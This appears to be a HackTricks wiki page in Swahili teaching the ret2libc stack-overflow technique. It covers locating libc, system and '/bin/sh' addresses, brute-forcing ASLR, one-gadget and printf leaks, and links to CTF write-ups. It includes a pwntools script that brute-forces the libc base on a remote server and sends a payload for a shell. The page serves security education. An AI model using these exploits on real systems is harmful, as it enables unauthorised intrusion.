# Ret2lib

{{#include ../../../banners/hacktricks-training.md}}

## **Taarifa za Msingi**

Kiini cha **Ret2Libc** ni kuelekeza mtiririko wa utekelezaji wa programu iliyo hatarini kwa kazi ndani ya maktaba ya pamoja (e.g., **system**, **execve**, **strcpy**) badala ya kutekeleza shellcode iliyotolewa na mshambuliaji kwenye stack. Mshambuliaji anaunda payload inayobadilisha anwani ya kurudi kwenye stack ili kuelekeza kwenye kazi ya maktaba inayotakiwa, huku pia akipanga kwa usahihi hoja zozote zinazohitajika kulingana na kanuni ya wito.

### **Hatua za Mfano (rahisi)**

- Pata anwani ya kazi ya kuita (e.g. system) na amri ya kuita (e.g. /bin/sh)
- Tengeneza mnyororo wa ROP ili kupitisha hoja ya kwanza ikielekeza kwenye mfuatano wa amri na mtiririko wa utekelezaji kwa kazi

## Kutafuta anwani

- Ikiwa `libc` inayotumika ni ile kutoka kwa mashine ya sasa unaweza kupata ambapo itapakuliwa kwenye kumbukumbu kwa:
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
Ikiwa unataka kuangalia kama ASLR inabadilisha anwani ya libc unaweza kufanya:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
- Kujua libc inayotumika pia inawezekana kupata offset ya kazi ya `system` kwa:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
- Kujua libc inayotumika pia inawezekana kupata offset ya kazi ya string `/bin/sh` kwa:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Kutumia gdb-peda / GEF

Kujua libc inayotumika, pia inawezekana kutumia Peda au GEF kupata anwani ya kazi ya **system**, ya kazi ya **exit** na ya mfuatano wa **`/bin/sh`** :
```bash
p system
p exit
find "/bin/sh"
```
### Kutumia /proc/\<PID>/maps

Ikiwa mchakato unaunda **watoto** kila wakati unapoizungumza nao (seva ya mtandao) jaribu **kusoma** faili hiyo (labda utahitaji kuwa root).

Hapa unaweza kupata **mahali hasa ambapo libc imepakuliwa** ndani ya mchakato na **mahali itakapopakuliwa** kwa kila mtoto wa mchakato.

![](<../../../images/image (853).png>)

Katika kesi hii imepakuliwa katika **0xb75dc000** (Hii itakuwa anwani ya msingi ya libc)

## Unknown libc

Inaweza kuwa haiwezekani kwamba **hujui libc ambayo binary inapakua** (kwa sababu inaweza kuwa kwenye seva ambayo huna ufikiaji wowote). Katika kesi hiyo unaweza kutumia udhaifu huo ili **kuvuja anwani kadhaa na kupata ni ipi libc** maktaba inatumika:

{{#ref}}
rop-leaking-libc-address/
{{#endref}}

Na unaweza kupata kiolezo cha pwntools kwa hili katika:

{{#ref}}
rop-leaking-libc-address/rop-leaking-libc-template.md
{{#endref}}

### Kujua libc kwa ofseti 2

Angalia ukurasa [https://libc.blukat.me/](https://libc.blukat.me/) na tumia **anwani kadhaa** za kazi ndani ya libc ili kugundua **toleo lililotumika**.

## Kupita ASLR katika bit 32

Mashambulizi haya ya nguvu ni **ya manufaa tu kwa mifumo ya 32bit**.

- Ikiwa exploit ni ya ndani, unaweza kujaribu nguvu za msingi wa anwani ya libc (ya manufaa kwa mifumo ya 32bit):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
- Ikiwa unashambulia seva ya mbali, unaweza kujaribu **kujaribu nguvu anwani ya kazi ya `libc` `usleep`**, ukipitia kama hoja 10 (kwa mfano). Ikiwa katika wakati fulani **seva inachukua sekunde 10 zaidi kujibu**, umepata anwani ya kazi hii.

## One Gadget

Tekeleza shell kwa kuruka tu kwenye **anwani** moja maalum katika libc:

{{#ref}}
one-gadget.md
{{#endref}}

## x86 Ret2lib Code Example

Katika mfano huu, ASLR brute-force imejumuishwa katika msimbo na binary iliyo hatarini iko kwenye seva ya mbali:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib Code Example

Angalia mfano kutoka:

{{#ref}}
../
{{#endref}}

## ARM64 Ret2lib Example

Katika kesi ya ARM64, amri ya ret inaruka kwenye eneo ambalo usajili wa x30 unashikilia na si kwenye eneo ambalo usajili wa stack unashikilia. Hivyo ni ngumu kidogo.

Pia katika ARM64, amri inafanya kile ambacho amri inafanya (haiwezekani kuruka katikati ya amri na kuzibadilisha kuwa mpya).

Angalia mfano kutoka:

{{#ref}}
ret2lib-+-printf-leak-arm64.md
{{#endref}}

## Ret-into-printf (au puts)

Hii inaruhusu **kuvuja taarifa kutoka kwa mchakato** kwa kuita `printf`/`puts` na data maalum iliyowekwa kama hoja. Kwa mfano, kuweka anwani ya `puts` katika GOT ndani ya utekelezaji wa `puts` kutavuja **anwani ya `puts` katika kumbukumbu**.

## Ret2printf

Hii kwa msingi inamaanisha kutumia **Ret2lib kubadilisha kuwa udhaifu wa mfuatano wa `printf`** kwa kutumia `ret2lib` kuita printf na thamani za ku exploit (inasikika kuwa haina maana lakini inawezekana):

{{#ref}}
../../format-strings/
{{#endref}}

## Mifano Mingine & marejeleo

- [https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html)
- Ret2lib, ikitoa uvujaji wa anwani ya kazi katika libc, kwa kutumia gadget moja
- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bit, ASLR imewezeshwa lakini hakuna PIE, hatua ya kwanza ni kujaza overflow hadi byte 0x00 ya canary ili kisha kuita puts na kuvuja. Kwa canary, gadget ya ROP inaundwa kuita puts kuvuja anwani ya puts kutoka GOT na gadget ya ROP kuita `system('/bin/sh')`
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bits, ASLR imewezeshwa, hakuna canary, overflow ya stack katika main kutoka kwa kazi ya mtoto. Gadget ya ROP kuita puts kuvuja anwani ya puts kutoka GOT na kisha kuita gadget moja.
- [https://guyinatuxedo.github.io/08-bof_dynamic/hs19_storytime/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/hs19_storytime/index.html)
- 64 bits, hakuna pie, hakuna canary, hakuna relro, nx. Inatumia kazi ya andika kuvuja anwani ya andika (libc) na inaita gadget moja.
- [https://guyinatuxedo.github.io/14-ret_2_system/asis17_marymorton/index.html](https://guyinatuxedo.github.io/14-ret_2_system/asis17_marymorton/index.html)
- Inatumia mfuatano wa format kuvuja canary kutoka kwenye stack na overflow ya buffer kuingia katika system (iko katika GOT) na anwani ya `/bin/sh`.
- [https://guyinatuxedo.github.io/14-ret_2_system/tu_guestbook/index.html](https://guyinatuxedo.github.io/14-ret_2_system/tu_guestbook/index.html)
- 32 bit, hakuna relro, hakuna canary, nx, pie. Tumia uorodheshaji mbaya kuvuja anwani za libc na heap kutoka kwenye stack. Tumia overflow ya buffer kufanya ret2lib ikitoa `system('/bin/sh')` (anwani ya heap inahitajika ili kupita ukaguzi).

{{#include ../../../banners/hacktricks-training.md}}
